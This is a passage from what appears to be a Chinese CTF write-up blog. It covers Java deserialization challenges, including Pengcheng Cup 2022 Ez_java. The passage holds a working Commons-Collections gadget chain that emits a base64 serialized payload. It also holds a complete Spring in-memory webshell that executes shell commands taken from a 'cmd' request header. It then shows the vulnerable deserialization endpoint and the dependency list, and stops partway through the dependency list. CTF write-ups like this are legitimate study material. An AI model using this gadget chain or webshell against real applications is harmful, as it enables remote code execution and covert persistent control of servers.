</span></span><span style="display:flex;"><span>setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;EvilTemplatesImpl&#34;</span><span style="color:#ff79c6">);</span> setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span>
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;_class&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>setFieldValue<span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>InstantiateFactory factory <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> InstantiateFactory<span style="color:#ff79c6">(</span>
</span></span><span style="display:flex;"><span>TrAXFilter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[]{</span>
</span></span><span style="display:flex;"><span>Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span>
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">},</span><span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]{</span>
</span></span><span style="display:flex;"><span>templates
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>FactoryTransformer chainedTransformer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> FactoryTransformer<span style="color:#ff79c6">(</span>factory<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>Transformer<span style="color:#ff79c6">[]</span> fakeTransformers <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Transformer<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span><span style="color:#ff79c6">new</span>
</span></span><span style="display:flex;"><span>ConstantTransformer<span style="color:#ff79c6">(</span>1<span style="color:#ff79c6">)};</span>
</span></span><span style="display:flex;"><span>Map innerMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>Map outerMap <span style="color:#ff79c6">=</span> DefaultedMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">decorate</span><span style="color:#ff79c6">(</span>innerMap<span style="color:#ff79c6">,</span> fakeTransformers<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>TiedMapEntry tiedMapEntry <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TiedMapEntry<span style="color:#ff79c6">(</span>outerMap<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;keykey&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>Map expMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>expMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>tiedMapEntry<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;valuevalue&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>outerMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">remove</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;keykey&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>setFieldValue<span style="color:#ff79c6">(</span>outerMap<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;value&#34;</span><span style="color:#ff79c6">,</span> chainedTransformer<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>ByteArrayOutputStream barr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>barr<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>expMap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">(</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encode</span><span style="color:#ff79c6">(</span>barr<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">())));</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ObjectInputStream ois = new ObjectInputStream(new
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>ByteArrayInputStream<span style="color:#ff79c6">(</span>barr<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">()));</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Object o = (Object)ois.readObject();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span> <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>随便找了一个内存马</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.easyjava.solve<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Method<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Scanner<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">springevil</span> <span style="color:#8be9fd;font-style:italic">extends</span> AbstractTranslet
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">transform</span><span style="color:#ff79c6">(</span>DOM document<span style="color:#ff79c6">,</span> SerializationHandler<span style="color:#ff79c6">[]</span> handlers<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> TransletException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">transform</span><span style="color:#ff79c6">(</span>DOM document<span style="color:#ff79c6">,</span> DTMAxisIterator iterator<span style="color:#ff79c6">,</span> SerializationHandler handler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> TransletException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">springevil</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Class c <span style="color:#ff79c6">=</span> Thread<span style="color:#ff79c6">.</span><span style="color:#50fa7b">currentThread</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getContextClassLoader</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">loadClass</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.springframework.web.context.request.RequestContextHolder&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Method m <span style="color:#ff79c6">=</span> c<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;getRequestAttributes&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Object o <span style="color:#ff79c6">=</span> m<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        c <span style="color:#ff79c6">=</span> Thread<span style="color:#ff79c6">.</span><span style="color:#50fa7b">currentThread</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getContextClassLoader</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">loadClass</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.springframework.web.context.request.ServletRequestAttributes&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        m <span style="color:#ff79c6">=</span> c<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;getResponse&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Method m1 <span style="color:#ff79c6">=</span> c<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;getRequest&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Object resp <span style="color:#ff79c6">=</span> m<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Object req <span style="color:#ff79c6">=</span> m1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span> <span style="color:#6272a4">// HttpServletRequest
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Method getWriter <span style="color:#ff79c6">=</span> Thread<span style="color:#ff79c6">.</span><span style="color:#50fa7b">currentThread</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getContextClassLoader</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">loadClass</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.servlet.ServletResponse&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;getWriter&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Method getHeader <span style="color:#ff79c6">=</span> Thread<span style="color:#ff79c6">.</span><span style="color:#50fa7b">currentThread</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getContextClassLoader</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">loadClass</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.servlet.http.HttpServletRequest&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;getHeader&#34;</span><span style="color:#ff79c6">,</span>String<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        getHeader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        getWriter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Object writer <span style="color:#ff79c6">=</span> getWriter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>resp<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        String cmd <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">)</span>getHeader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>req<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;cmd&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        String<span style="color:#ff79c6">[]</span> commands <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[</span>3<span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>        String charsetName <span style="color:#ff79c6">=</span> System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;os.name&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">toLowerCase</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">contains</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;window&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">?</span> <span style="color:#f1fa8c">&#34;GBK&#34;</span><span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;os.name&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">toUpperCase</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">contains</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;WIN&#34;</span><span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            commands<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;cmd&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            commands<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/c&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            commands<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/bin/sh&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            commands<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;-c&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        commands<span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> cmd<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        writer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;println&#34;</span><span style="color:#ff79c6">,</span> String<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>writer<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> Scanner<span style="color:#ff79c6">(</span>Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span>commands<span style="color:#ff79c6">).</span><span style="color:#50fa7b">getInputStream</span><span style="color:#ff79c6">(),</span>charsetName<span style="color:#ff79c6">).</span><span style="color:#50fa7b">useDelimiter</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;\\A&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">next</span><span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        writer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;flush&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>writer<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        writer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;close&#34;</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>writer<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><h1 id="鹏程杯2022-ez_java">鹏程杯2022 Ez_java</h1>
<p>路由</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">//
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// Source code recreated from a .class file by IntelliJ IDEA
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// (powered by FernFlower decompiler)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">//
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">package</span> com.example.Ez_Java.controller<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.example.Ez_Java.util.Secure<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.InputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.OutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Base64<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.servlet.http.HttpServletRequest<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.servlet.http.HttpServletResponse<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.tomcat.util.http.fileupload.IOUtils<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.core.io.ClassPathResource<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.stereotype.Controller<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.PostMapping<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.RequestMapping<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.RequestParam<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.springframework.web.bind.annotation.ResponseBody<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>@Controller
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">IndexController</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">IndexController</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    @RequestMapping<span style="color:#ff79c6">({</span><span style="color:#f1fa8c">&#34;/index&#34;</span><span style="color:#ff79c6">})</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> String <span style="color:#50fa7b">index</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;草，走，忽略！ጿ ኈ ቼ ዽ ጿ&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    @RequestMapping<span style="color:#ff79c6">({</span><span style="color:#f1fa8c">&#34;/flag&#34;</span><span style="color:#ff79c6">})</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">flag</span><span style="color:#ff79c6">(</span>HttpServletRequest request<span style="color:#ff79c6">,</span> HttpServletResponse response<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        ClassPathResource resource <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ClassPathResource<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;static/video/flag.mp4&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        response<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setContentType</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;video/mp4&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        response<span style="color:#ff79c6">.</span><span style="color:#50fa7b">addHeader</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Content-Length&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">+</span> resource<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getInputStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">available</span><span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        InputStream is <span style="color:#ff79c6">=</span> resource<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getInputStream</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        OutputStream os <span style="color:#ff79c6">=</span> response<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getOutputStream</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        IOUtils<span style="color:#ff79c6">.</span><span style="color:#50fa7b">copy</span><span style="color:#ff79c6">(</span>is<span style="color:#ff79c6">,</span> os<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    @PostMapping<span style="color:#ff79c6">({</span><span style="color:#f1fa8c">&#34;/read&#34;</span><span style="color:#ff79c6">})</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> String <span style="color:#50fa7b">read</span><span style="color:#ff79c6">(</span>@RequestParam<span style="color:#ff79c6">(</span>name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;data&#34;</span><span style="color:#ff79c6">,</span>required <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">)</span> String data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ClassNotFoundException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b <span style="color:#ff79c6">=</span> Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDecoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">decode</span><span style="color:#ff79c6">(</span>data<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        InputStream bis <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Secure ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Secure<span style="color:#ff79c6">(</span>bis<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;沈阳等你噢&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>依赖</p>
<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;project xmlns=&#34;http://maven.apache.org/POM/4.0.0&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
         xsi:schemaLocation=&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;2.6.6&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.example&lt;/groupId&gt;
    &lt;artifactId&gt;Ez_Java&lt;/artifactId&gt;
    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
    &lt;name&gt;Ez_Java&lt;/name&gt;
    &lt;description&gt;Ez_Java&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;1.8&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.javassist&lt;/groupId&gt;
            &lt;artifactId&gt;javassist&lt;/artifactId&gt;
            &lt;version&gt;3.25.0-GA&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
            &lt;optional&gt;true&lt;/optional&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.flex.blazeds&lt;/groupId&gt;
            &lt;artifactId&gt;flex-messaging-core&lt;/artifactId&gt;
            &lt;version&gt;4.7.2&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;!-- https://mvnrepository.com/artifact/org.json/json --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.json&lt;/groupId&gt;
            &lt;artifactId&gt;json&lt;/artifactId&gt;
            &lt;version&gt;20211205&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
